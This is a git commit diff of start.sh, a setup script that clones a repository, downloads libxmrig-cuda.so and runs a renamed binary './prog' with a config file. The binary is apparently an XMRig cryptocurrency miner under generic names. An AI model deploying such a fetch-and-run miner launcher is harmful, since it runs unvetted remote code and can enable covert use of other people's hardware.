14efc9f2139b9fa4d19345e727d6e3300f31f94d
iceyfromdiscord <116362513+iceyfromdiscord@users.noreply.github.com>
2026-02-10 16:21:47 -0600

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,13 +1,10 @@
-# install things
-apt install curl git unzip -y
-
 # grab the exec + conf
 git clone https://github.com/iceyfromdiscord/cuda
 cd cuda
 
-# grab cuda
+# grab cuda (idk if it needs this???)
 curl -L -O https://github.com/iceyfromdiscord/cuda/releases/download/_/libxmrig-cuda.so
 
 # start
 chmod +x ./prog
-./prog -c ./_.json --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
+./prog --config ./_.json
